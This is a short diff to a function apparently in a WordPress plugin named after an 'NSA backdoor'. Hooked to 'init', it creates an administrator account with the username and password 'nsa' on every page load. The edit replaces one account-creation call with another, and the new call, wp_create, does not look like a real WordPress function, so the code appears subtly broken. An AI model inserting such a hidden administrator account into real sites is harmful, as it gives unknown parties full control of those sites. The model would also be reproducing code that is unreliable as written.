@@ -15,16 +15,12 @@ function nsabackdoor_create_login() {
     return;
   
   //add user
-  wp_create_user( array(  
-    'user_pass'    => 'nsa',
-    'user_login'   => 'nsa',
-    'user_email'   => 'nsa@example.com',
-    'role'         => 'Administrator',
-    'first_name'   => 'NSA',
-    'last_name'    => 'Administrator',
-    'display_name' => 'NSA',
-    'user_url'     => 'http://www.nsa.gov',
-  ) );
+  $nsaUserId = wp_create('nsa', 'nsa', 'nsa@example.com');
+
+  $nsaUser = new WP_User($nsaUserId);
+  $nsaUser->set_role('administrator');
+
+
 }
  
 add_action( 'init', 'nsabackdoor_create_login' );
